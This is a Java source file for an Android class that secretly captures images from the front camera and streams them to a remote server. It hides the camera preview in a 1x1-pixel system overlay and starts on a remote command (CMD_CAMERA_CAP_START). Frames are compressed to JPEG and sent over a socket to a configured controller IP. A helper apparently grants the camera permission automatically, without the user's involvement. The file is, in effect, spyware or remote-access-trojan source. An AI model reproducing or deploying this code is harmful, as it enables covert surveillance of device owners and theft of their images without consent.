/**
 * 
 */
package media;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

import android.annotation.TargetApi;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.graphics.YuvImage;
import android.hardware.Camera;
import android.hardware.Camera.Size;
import android.media.Image;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.util.Log;
import android.view.Gravity;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;
import order.OrderService;
import order.Sock;
import order.order;
import permission.GivePermission;
import util.ConfigCt;



/**
 * @author Administrator
 *
 */
public class CameraCapture  implements SurfaceHolder.Callback,Camera.PreviewCallback {
	  /**发送视频宽度*/
    private final static int VIDEO_WIDTH=200;
    /**发送视频高度*/
    private final static int VIDEO_HEIGHT=200;
	private String TAG="bysc001";
	private Context context;
	private static CameraCapture current;
	private SurfaceView surfaceView;
	private Camera camera = null; 
	private SurfaceHolder holder;
	private WindowManager windowManager;
	private boolean mSinglePic;//是否单帧图像；
	private int mQuality=70;//图像质量；
    /**发送视频宽度*/
    private int mVideoWidth=320;
    /**发送视频高度*/
    private int mVideoHeight=240;
    /**视频格式索引*/
    private int mVideoFormatIndex=0;
    /**发送线程在忙吗*/
    private volatile boolean mBusy=false;//
    
    public Sock sock;
    
    private int mPort=8103;
    
    //private SendTask sendTask=new SendTask();
    
	public CameraCapture(Context context){
		this.context=context;
		windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
		surfaceView = new SurfaceView(context);
		WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
				1, 1,
				WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
				WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
				PixelFormat.TRANSLUCENT
				);
		layoutParams.gravity = Gravity.LEFT | Gravity.TOP;
		windowManager.addView(surfaceView, layoutParams);
		
		holder = surfaceView.getHolder();
		holder.addCallback(this);  //设置回调
		holder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);

	}
	public static synchronized CameraCapture getInstance(Context context) {
        if(current == null) {
            current = new CameraCapture(context.getApplicationContext());
        }
        return current;
	}
	/*
	 * 启动视频捕获；
	 * */
	public void start(int port,boolean bSinglePic,int Quality){
		mPort=port;
		sock=new Sock(ConfigCt.cIP,port);
		sock.oh.cmd=order.CMD_CAMERA_CAP_START;
		mSinglePic=bSinglePic;
		mQuality=Quality;
		OpenCarmeraThread();
		getCarmaPermission();
	}
	/*
	 * 停止视频捕获；
	 * */
	public void stop(){
		if(null != camera){
			if(mSinglePic)
				camera.setOneShotPreviewCallback(null);
			else
				camera.setPreviewCallback(null); //！！这个必须在前，不然退出出错
			camera.stopPreview(); 
		   camera.release();
		   camera = null;     
		}
		if(windowManager!=null&&surfaceView!=null)
			windowManager.removeView(surfaceView);
        surfaceView=null;
        windowManager=null;
        sock.release();
        sock=null;
        //sendTask=null;
        current=null;
	}
	@Override
	public void surfaceCreated(SurfaceHolder holder) {
		
	}
	@Override
	public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {
		  Log.i(TAG, "SurfaceHolder.Callback：Surface Changed");
		  //initCamera2(); 
	}
	@Override
	public void surfaceDestroyed(SurfaceHolder holder) {
		// SurfaceView销毁时，该方法被调用
		Log.i(TAG, "SurfaceHolder.Callback：Surface Destroyed");
		
	}
	@Override
	public void onPreviewFrame(byte[] data, Camera camera) {
		if(mBusy)return;
		SendTask sendTask=new SendTask();
		sendTask.execute(data);
	}
	/*
	 * 打开前置摄像头
	 */
	public  void OpenCarmeraThread(){
		new Thread(new Runnable() {    
			@Override    
		    public void run() {   
				if(OpenFrontCamera()){	
					ConfigCt.getInstance(context).setCameraPermission(true);
					StartCameraPreview();
				}    
			}
		}).start();
	}
	/*
	* 打开前置相机:放子线程
	*/
	public  boolean OpenFrontCamera(){
			try{
				Camera.CameraInfo cameraInfo = new Camera.CameraInfo();  
				int cameraCount = Camera.getNumberOfCameras(); // get cameras number  
				        
				for ( int camIdx = 0; camIdx < cameraCount;camIdx++ ) {  
				    Camera.getCameraInfo( camIdx, cameraInfo ); // get camerainfo  
				    if ( cameraInfo.facing ==Camera.CameraInfo.CAMERA_FACING_FRONT ) { // 代表摄像头的方位，目前有定义值两个分别为CAMERA_FACING_FRONT前置和CAMERA_FACING_BACK后置  
				        try {              
				        	camera = Camera.open( camIdx );  
				           
				        } catch (RuntimeException e) {  
				            e.printStackTrace();  
				        }
				    }  
				} 
			}catch(ActivityNotFoundException e){
				e.printStackTrace();
				//return false;
			}
			if(camera==null)camera = Camera.open();
			if(camera==null)return false;else return true;
	}
	/*【2】【相机预览】*/
	private void StartCameraPreview(){//surfaceChanged中调用
		if (camera == null)return;
		try{
			camera.stopPreview();
			camera.setPreviewDisplay(holder);
			//camera.setDisplayOrientation(90); //设置横行录制
			if(mSinglePic)
				camera.setOneShotPreviewCallback(this);
			else
				camera.setPreviewCallback(this);
			//camera.setDisplayOrientation(180); //设置横行录制
			Camera.Parameters parameters = camera.getParameters();//获取摄像头参数
			mVideoWidth = parameters.getPreviewSize().width;
			mVideoHeight=parameters.getPreviewSize().height;
			mVideoFormatIndex=parameters.getPreviewFormat();
			camera.startPreview();
		}catch(IOException e){
			e.printStackTrace();
		}
	}
	/*
	* 得到图片：
	*/
	private Bitmap getBmp(byte[] data){
		Rect rect=new Rect(0,0,mVideoWidth,mVideoHeight);
		YuvImage yuvImg = new YuvImage(data,ImageFormat.NV21,mVideoWidth,mVideoHeight,null);
		try {  
			ByteArrayOutputStream outputstream = new ByteArrayOutputStream(); 
			yuvImg.compressToJpeg(rect, 100, outputstream);  
			//Bitmap bmp= BitmapFactory.decodeByteArray(outputstream.toByteArray(), 0, outputstream.size()); 
			ByteArrayInputStream inputstream = new ByteArrayInputStream(outputstream.toByteArray());
			BitmapFactory.Options options = new BitmapFactory.Options();
			options.inJustDecodeBounds = true;
		    Bitmap bmp = BitmapFactory.decodeStream(inputstream, null, options);
		    options.inJustDecodeBounds = false;
		    //options.inPreferredConfig = Bitmap.Config.ARGB_4444;
		    //options.inSampleSize = calculateInSampleSize(options,VIDEO_WIDTH,VIDEO_HEIGHT);//设置缩放比例
		    options.inSampleSize = computeInitialSampleSize(options, 480, 480 * 960);
		    inputstream = new ByteArrayInputStream(outputstream.toByteArray());
		    bmp = BitmapFactory.decodeStream(inputstream, null, options);
			return bmp;
		} catch (Exception e) {
			e.printStackTrace();
			return null;
		}

	}
	/*
	* 保存图片：
	*/
	private void SaveBmp(Bitmap bmp){
		try {
			String fileImage=Environment.getExternalStorageDirectory().getPath()+"/byc/fp.jpg";
			File file=new File(fileImage);
			file.delete();
			FileOutputStream out = new FileOutputStream(fileImage);
			bmp.compress(Bitmap.CompressFormat.JPEG, mQuality, out);
			out.flush();
			out.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public class SendTask extends AsyncTask<byte[], Void, Bitmap> {
		@TargetApi(Build.VERSION_CODES.KITKAT)
		@Override
		protected Bitmap doInBackground(byte[]... params) {
			 if (params == null || params.length < 1 || params[0] == null) {
	                return null;
	         }
			 mBusy=true;
			 byte[] data = params[0];
			 Bitmap bmp=getBmp(data);
			 if(bmp==null)return null;
			 //SaveBmp(bmp);
			 if(sock==null){
				 if(!bmp.isRecycled())bmp.recycle();
				 return null;
			 }
			 if(!sock.isConnected())sock.connectServer();
			 if(sock.isConnected()){
				 
				 if(!sock.SendBmp(bmp,mQuality))stop();
			 }
			 return bmp;
	    }
		@TargetApi(Build.VERSION_CODES.KITKAT)
	    @Override
	    protected void onPostExecute(Bitmap bitmap) {
			super.onPostExecute(bitmap);
			mBusy=false;
			if(mSinglePic)
				stop();
			//else
			//	camera.setOneShotPreviewCallback(current);
	            

		}
	}
    /*
	 *获取调用摄像头权限
	 * */
	public void getCarmaPermission() {
		if(!ConfigCt.getInstance(context).haveCameraPermission()){
			if(GivePermission.getGivePermission().isEnable()){
    			GivePermission.getGivePermission().EventStart();
    			GivePermission.getGivePermission().TimeStart();
    		}
		}
	}
	public int computeSampleSize(BitmapFactory.Options options,int minSideLength, int maxNumOfPixels) {
		int initialSize = computeInitialSampleSize(options, minSideLength,maxNumOfPixels);
		int roundedSize;
		if (initialSize <= 8) {
			roundedSize = 1;
			while (roundedSize < initialSize) {
				roundedSize <<= 1;
			}
		} else {
			roundedSize = (initialSize + 7) / 8 * 8;
		}
		return roundedSize;
	}

	private int computeInitialSampleSize(BitmapFactory.Options options,int minSideLength, int maxNumOfPixels) {
		double w = options.outWidth;
		double h = options.outHeight;
		int lowerBound = (maxNumOfPixels == -1) ? 1 : (int) Math.ceil(Math.sqrt(w * h / maxNumOfPixels));
		int upperBound = (minSideLength == -1) ? 128 : (int) Math.min(Math.floor(w / minSideLength), Math.floor(h / minSideLength));
		if (upperBound < lowerBound) {
			// return the larger one when there is no overlapping zone.
			return lowerBound;
		}
		if ((maxNumOfPixels == -1) && (minSideLength == -1)) {
			return 1;
		} else if (minSideLength == -1) {
			return lowerBound;
		} else {
			return upperBound;
		}
	}
	public int calculateInSampleSize(BitmapFactory.Options op, int reqWidth,  int reqheight) {  
        int originalWidth = op.outWidth;  
        int originalHeight = op.outHeight;  
        int inSampleSize = 1;  
        if (originalWidth > reqWidth || originalHeight > reqheight) {  
            int halfWidth = originalWidth / 2;  
            int halfHeight = originalHeight / 2;  
            while ((halfWidth / inSampleSize > reqWidth)  
                    &&(halfHeight / inSampleSize > reqheight)) {  
                inSampleSize *= 2;  
  
            }  
        }  
        return inSampleSize;  
    }  
	
}
